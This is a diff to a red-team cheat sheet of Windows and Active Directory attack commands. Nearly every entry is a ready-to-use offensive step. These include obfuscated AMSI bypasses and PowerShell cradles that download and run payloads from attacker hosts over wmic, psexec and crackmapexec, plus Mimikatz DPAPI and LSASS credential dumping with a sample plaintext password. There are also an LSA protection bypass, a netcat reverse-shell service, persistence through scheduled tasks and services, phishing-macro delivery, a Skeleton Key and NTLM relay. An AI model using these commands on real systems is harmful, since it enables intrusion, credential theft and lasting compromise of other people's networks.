@@ -1,19 +1,32 @@
 GhostPack Tools
-  Seatbelt.exe system|user (Opsec Tool)
+  SharpGPOAbuse.exe GPO modificatino tool
+  Seatbelt.exe -group=all -full -outputfile="c:\windows\temp\out.txt"
   SharpUp.exe (Privesc Tool)
   SharpDump.exe (LSASS MiniDump Tool)
   SharpView.exe (Network Enumeration) (Use module -Help to get syntax)
     - Exmaple: SharpView.exe Get-NetLoggedon localhost
     - PowerView Examples: https://powersploit.readthedocs.io/en/latest/Recon
-  SharpHound.exe -c All,Loggedon [-s|-d] --Throttle 20 --Jitter 7 --NoSaveCache --RandomFilenames --EncryptZip
+  SharpHound.exe -c All,GPOLocalGroup --windowsonly --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties  --throttle 10000 --jitter 23
+    - Jitter is in milliseconds; 10000 = 10 seconds
   Rubeus.exe (Kerberose Tool)
   SharpDPAPI.exe
-    - SharpDPAPI backupkey /server:dc01.fqdn /file:keyname.pvk (file is optional; base64 without)
-    - SharpDPAPI traiage /pvk:key.pvk or /pvk:Base64
-    - SharpDPAPI machinetriage (must be system)
+    - DA: SharpDPAPI backupkey /server:dc01.fqdn /file:keyname.pvk (file is optional; base64 without)
+    - System: SharpDPAPI machinetriage
+    - User Get Key: mimikatz @dpapi::masterkey /in:”C:\Users\dfm.a\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1110\ca748af3-8b95-40ae-8134-cb9534762688″ /rpc
+    - User Decrypt Mimikatz: mimikazt @dpapi::cred /in:"C:\Users\s.bowers\AppData\Local\Microsoft\Credentials\5DD604C1E108746934B92E2A20318758" /masterkey:REDACTED
+    - User Decrypt Rubeus: SharpDPAPI traiage /pvk:key.pvk or /pvk:Base64
+    
   AMSIBypass - Rastamouse
     - [System.Reflection.Assembly]::LoadFile("D:\Tools\ASBBypass\ASBBypass\bin\Release\ASBBypass.dll")
     - [Amsi]::Bypass()
+    Poweshell AMSI Bypass
+       (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQAqAHQAaQBsAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0ACoAYQBpAGwAZQBkAA==')))}).SetValue($null,$true)
+    AMSI Bypass Script
+        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUt' + 'ils')
+        $h = "4456625220575263174452554847"
+        $s = [string](0..13|%{[char][int](53+($h).substring(($_*2),2))})-replace " "
+        $b = $a.GetField($s, 'NonPublic,Static')
+        $b.SetValue($null,$true)
     
 Bloodhound/Neo4J
   # FIND SPN WITH DOMAIN ADMIN
@@ -31,9 +44,54 @@ Bloodhound/Neo4J
   UNWIND tempVar AS comps
   RETURN u.name,COUNT(DISTINCT(comps))
   ORDER BY COUNT(DISTINCT(comps)) DESC
+
+Set Time/Date: timedatectl set-time 13:05:30
+
+Linux Powershell (Pwsh)
+  Import a module syntax
+  Import-Module .\Invoke-CradleCrafter.psd1; Invoke-CradleCrafter
+  
+Powershell Encoding (AMSI Bypass)
+  Base64: 
+    $malicious = "am" + "siutils"
+    [Convert]::ToBase64String([Text.encoding]::UTF8.GetBytes($malicious))
+  Encrypted:
+    $malicious = "am" + "siutils"
+    $encrypted = @()
+    $decrypted = @()
+    foreach($byte in [Text.Encoding]::UTF8.GetBytes($malicious)){ $encrypted += $byte -bxor 1 }
+    [Test.Encoding]::UTF8.GetString($decrypted)
+  
+Poweshell Contrained Language Mode
+  Put Beacon on disk and run the following
+  forfile /p C:\Windows\System32 /m calc.exe /c 'path_to_beacon.exe'
+  example: forfile /p C:\Windows\System32 /m ping.exe /c 'c:\windows\temp\beacon.exe'
   
 Antivirus Info
   WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+
+Mimikatz DPAPI
+* https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/
+* https://ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++
+  Credential files for SYSTEM: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials (Vaults, etc..)
+  Credential files for USERS: C:\Users\user\AppData\Local\Microsoft\Credentials\ (Vaults, etc..)
+      Example: c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
+  Get masterkey GUID
+      mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
+      Example:  guidMasterKey : {7dc6a492-36e2-4c2d-be66-ba29d263dda2}
+  Check if decrypted masterkey is in LSASS
+       mimikatz !sekurlsa::dpapi
+  Locate encrypted masterkey if not in lsass
+      Encrypted masterkeys are located at: c:\users\username\AppData\Roaming\Microsoft\Protect\
+      Example: c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2
+  Decrypte masterkey
+      mimikatz dpapi::masterkey /in:"c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2" /rpc
+      or
+      mimikatz dpapi::masterkey /in:"c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2" /sids:S-1-5-21-1396373213-2872852198-2033860859-1151 /password:Sarah2017 /protected
+      Copy masterkey; key : dcd70638e50e3bcec7cd7fb888399748.......
+  Decrypt Credential File
+      mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 /masterkey:dcd70638e50e3bcec7cd7fb8......
+      
   
 PowerView
   Trusts: Get-DomainTrust -SearchBase “GC://$($ENV:USERDNSDOMAIN)”
@@ -53,15 +111,26 @@ MSBuild Beacon
     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml
   Powershell IEX
     "powershell iex (new-object net.webclient).downloadstring('http://10.10.10.10/update')"
+    sudo crackmapexec smb 10.10.5.30 --obfs -u username -p='password' -x "powershell.exe -version 3 -c IEX ([net.webclient]::new().downloadstring('http://10.10.5.13:80/update'))"
+    Upload exe and execute
+        iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe
+        crackmapexec smb 10.10.5.30 -u username -p password -X 'powershell.exe -version 3 iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe'
+        c:\windows\temp\test.exe
     
-  MSBuild NPS 
-    Genereate XML using script from https://github.com/trustedsec/nps_payload
-    Create cobalt listener
-    Disable AMSI on target
-    Upload XML to target or Run XML from File Server
-    Execute %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe c:\windows\temp\msbuild_nps.xml
-
 Remote Execute
+  Examples:
+      remote-exec wmi 10.9.15.200 powershell.exe -f c:\windows\temp\beacon.ps1 (stageless PS beacon)
+      powershell.exe -nop -w hidden -c iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')
+      Invoke-WebRequest "http://10.10.16.13/bd" -OutFile "C:\users\public\downloads\bd.exe"
+      Invoke-Command -computername HOSTNAME -scriptblock {"C:\users\public\downloads\bd.exe" -AsJob}
+      powerpick invoke-command -computername corewkt002.core.cyber.local -scriptblock {iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')}
+      powershell iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')
+      shell wmic /node:10.9.15.200 process call create "powershell.exe -nop -w hidden iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')"
+        * PS windows may popup for a second on target
+      psexec \\10.9.15.200 /user:Domain.local\Administrator -s "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -InputFormat None -nop -w hidden -c "iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')"
+      psexec \\10.9.15.200 /user:Domain.local\Administrator -s "C:\Users\user\desktop\beacon.exe"
+      * -s Runs as SYSTEM and -c copies file to C:\Windows on remote system
+  
   CrackMapExec
     crackmapexec IP_Address -u username -p='password' (Test if you have access)
     crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
@@ -74,15 +143,23 @@ Remote Execute
     
   LolBin
     runas /netonly /user:domain\username powershell.exe
-    wmic /node:10.0.0.6 /user:administrator process call create "powershell.exe iex (new-object net.webclient).downloadstring('http://10.10.5.10/update')"
+    wmic /node:10.0.0.6 /user:administrator /password:asdfadf process call create "powershell.exe iex (new-object net.webclient).downloadstring('http://10.10.5.10/update')"
     schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
     * COPY ANY SYSTEM FILE
       C:\windows\system32\esentutl.exe /y <source-file> /vss /d <dest-file>
       
+Phishing Macro XLM 
+    Download https://github.com/FortyNorthSecurity/hot-manchego
+    PS> New-Item blank.xlsm
+    PS> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs
+    PS> .\hot-manchego.exe .\blank.xlsm .\vba.txt
+    Deliver xlsm file    
+
 Apache Tomcat JServ exploit
     https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/
     Install the Dependencies on attack box
-        apt install libapache2-mod-jk a2enmod proxy_ajp
+        apt install libapache2-mod-jk 
+        a2enmod proxy_ajp
     Configure Apache
         ProxyRequests Off
         # Only allow localhost to proxy requests
@@ -101,15 +178,6 @@ Apache Tomcat JServ exploit
     Start Listener
     Once uploaded make sure to visit the malicious URL (available in applications list) at least once to cause the WAR to execute.
   
-Metasploit Pro Exploits
-  Windows Escalate UAC Protection Bypass
-      Scheduled Tasks Microsoft\Windows\DiskCleanup run with higest prividleges
-      Change %windir% environment variable to a folder with your payload
-
-  DCOM Exec
-      https://ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model
-      Remote DCOM command execution using credentials
-
 SCF Hash Collection
     Create a scf file extension with the following contents in a Windows File Share:
         [Shell]
@@ -133,12 +201,44 @@ Net Commands
   shell net group "Domain Admins" /domain
   shell net group "Domain Admins" username /add /domain
   
-Overpass the Hash
-  dcsync fqdn domain\user (User must have DCSync rights in that domain)
-  dcsync fqdn domain\krbtgt (golden ticket)
-  dcsync fqdn (dump entire domain hashes)
-  Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
+Cobalt-Metasploit
+  Connect MetaSploit to Cobalt Listener
+    msf: set lhost cobalt host
+    msf: set lport cobalt listener (normal https listener)
+    msf: set prependmigrate true
+    msf: set disablepayloadhandler true
+    msf: exploit
+    
+  Connect Cobalt to Metasploit
+    cobalt: create foreign https listener
+    msf: use multi/handler
+    msf: set payload windows/meterpreter/reverse_https
+    msf: set ExitOnSesssion False
+    msf: exploit -j
+    cobalt: spawn x86 foreign-https
+    
+  Post Exploit Find Metasploit Exploits (like Watson)
+    * Note: Jon's tool Ghost works great for AV bypass (if errors then run: sudo gem install metasm)
+    use post/multi/recon/local_exploit_suggester
 
+Inveigh
+  Import Inveigh Powershell Script
+  Invoke-Inveigh -LLMNR Y -NBNS Y -DNS N -HTTP N -StatusOutput Y -ConsoleOutput Y -ConsoleStatus 1
+    - prints PW results every 1 minute
+  Invoke-Inveigh -ConsoleOutput N -RunTime 30 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y
+  * Agressor script: https://github.com/Und3rf10w/Aggressor-scripts
+  
+Socks Proxy Trick
+    Start CS Socks -> ssh -tt -v -L 9050:localhost:<CS Socks Port> user@10.10.10.10
+  
+Kerberos Info:
+    TGTDelg: Request another user's service ticket using any user account and impersonate that user
+        Rubues: tgtdelg           Impacket: getST.py           (Need to be authenticated)
+    ASREP Roast: Get hash for a user with "Do not require kerberos preauth" set
+        Rubues: asreproast        Impacket: GetNPUsers.py      (Do not need to be authenticated)
+    Kerberoast: Get the hash of an account with a SPN Set to crack   
+        Rubeus: kerberoast        Impacket: GetUserSPNs.py     (Need to be authenticated)
+   
 PrivEsc
   Kerberoast (Request SPN and get the TGS for offline cracking)
     Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
@@ -148,19 +248,35 @@ PrivEsc
     Rubeus.exe /tgtdeleg /user:sqlservice (<-SamAccountName)
 
   MiniDump - Offline PW dump
-    .\createminidump.exe
-    .\mimikatz.exe
-    sekurlsa::minidump c:\temp\lsass.dmp
-    sekurlsa::logonpasswords
+    SharpDump.exe
+        Download debugXX.bin
+        Move to offline system; rename to debugXX.gz -> decompress
+        minikatz "sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords" (must be on same Arch)
+    Dumpert: https://github.com/outflanknl/Dumpert (Should avoid AV and EDR)
     
+  Check for Protected LSASS (Reboot required if changing values)
+    shell reg query "hklm\system\currentcontrolset\control\lsa" 
+      LSA Protection: RunAsPPL (0x1 = Protected; Reboot required if changed to 0)
+      Credential Guard: LsaCfgFlagsDefault (Windows Defender Credential Guard with UEFI lock, set it to 2 to enable Windows Defender Credential Guard without lock, and set it to 0 to disable it.)
+  
+  Bypass Protected LSASS (may not work)
+    Execute: PPLKiller /installDriver (loads RTCore64.sys driver)
+    Execute: PPLKiller /makeSYSTEMcmd (Gets SYSTEM shell)
+    Execute: PPLKiller /uninstallDriver (removes driver)
+  
+  Mimikatz
+    lsadump::secrets (Only SYSTEM can read)
+      Clear Text Passwords from Registry: HKEY_LOCAL_MACHINE/Security/Policy/Secrets
+  
   Dump DC NTDS.dit
     powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
     /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
     crackmapexec can dump NTDS.dit
     
   Printer Bug (Get DC TGT from Unconstrained Delegation machine)
+      Must exploit a system running Unconstrained Delegation (UD)
       Rubeus monitor /interval:1 (monitors for TGT when spoolsample is run)
-      Spoolsample.exe DC01.FQDN Host_running_rubeus.fqdn
+      Spoolsample.exe \\DC01.FQDN \\UnConstrainedDelegation.FQDN
       Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIB... (should not have valid TGT in memory)
 
   Schedule Tasks/Trusted Installer
@@ -179,9 +295,9 @@ PrivEsc
     Download Poweshell PS1: https://github.com/G0ldenGunSec/PowerPriv
     Compromised Beacon: Powershell-Import /path/powerPriv.ps1
     Compromised Beacon: socks 36529
-    Compromised Beacon: rportfwd 80 127.0.0.1 80
+    Compromised Beacon: rportfwd 80 127.0.0.1 80 (or rportfwd 80 127.0.0.1 8080)
     Kali: Verify /etc/proxychains.conf port matches socks above
-    Kali: proxychains ntlmrelayx -t ldap://DC_IP --escalate-user username (-attackerPort 8080)
+    Kali: proxychains ntlmrelayx -t ldap://DC_IP --escalate-user username (--http-port 8080)
     Compromised Beacon: powershell PowerPriv -targetHost Exchange_IP -attackerHost Beacon_IP (may be internal IP)
     dcsync fqdn dom\user
    
@@ -224,10 +340,30 @@ PrivEsc
         mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
         mimikatz kirbikator lsa file.kirbi
     
+Bypass UAC
+  C# Code: https://github.com/juliourena/plaintext/tree/master/CSharp%20Tools/UAC%20Bypass
+  Upload payload to target
+  execute-assembly /opt/tools/CSharp_Tools/Compiled/uac_bypass_silentcleanup.exe C:\Users\username\AppData\Local\Temp\smb-x64.exe
+    
 Persistance
-  schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
+  StayKit
+    Service:
+      Name=MyService
+      Command=C:\Windows\Temp\myservice.exe
+      Drop Location=Command=C:\Windows\Temp\myservice.exe
+      Listener: https
+      Custom File: /root/beacons/beacon-svc.exe
+  Scheduled Tasks:
+    Same as above, but time must be 11:30 format and repitition is 5 (ie PT5H) so run every 5 hours.
+    * Path Example: Task= Microsoft\Windows\SyncCenter\MyTaskName
+
+  shell sc create MyService binpath= c:\windows\temp\https-local-svc-x64.exe start= auto
+  
+  schtasks /create /f /sc minute /mo 1 /tn "Microsoft\Windows\WwanSvc\WUpdater" /ru "SYSTEM" /tr "cmd.exe /C tasklist | findstr.exe gpupdater.exe || start c:\windows\system32\gpupdater.exe"
+    Runs every 1 minute to see if gpupdater.exe process is not running and restart it if not
   sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
     sc start evilsvc
+  sc \\myserver create NewService binpath= c:\windows\system32\NewServ.exe
   reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1 /d "C:\temp\evil.exe|dll"
 
   # Mimikatz Skeleton Key (default master password is mimikatz)
@@ -274,3 +410,20 @@ Windows Commands
       ls -r -d 2 -i *pass* c:\path | ? {$_.LastWriteTime -lt (Get-Date).AddDays(-30)} | select LastWriteTime, FullName | epcsv -NotypeInformation ./test.csv
     Powershell Console Logs
       gc "C:\Users\<username>\Application Data\microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
+    Powershell Zip Compress
+      Compress-Archive -Path C:\path\file -DestinationPath C:\path\file.zip
+      
+Windows Port Forwarding
+Port Forward
+    Show Proxy: netsh interface portproxy show all
+    Set PortForward: netsh interface portproxy add v4tov4 listenport=8443 listenaddress=10.10.14.3 connectport=443 connectaddress=10.10.5.13
+    Reset Proxy: netsh interface portproxy reset
+    
+Windows proxy through Kali VPN
+    Windows: Set Static IP on Windows and set GW to Kali IP
+    Kali: Set IPv4 Forwarding
+        sudo sysctl net.ipv4.ip_forward
+    Kali: IPTables
+        sudo iptables -t nat -A POSTROUTING -o tun0 -j  MASQUERADE
+        sudo netfilter-persistent save
+        sudo systemctl enable netfilter-persistent.service
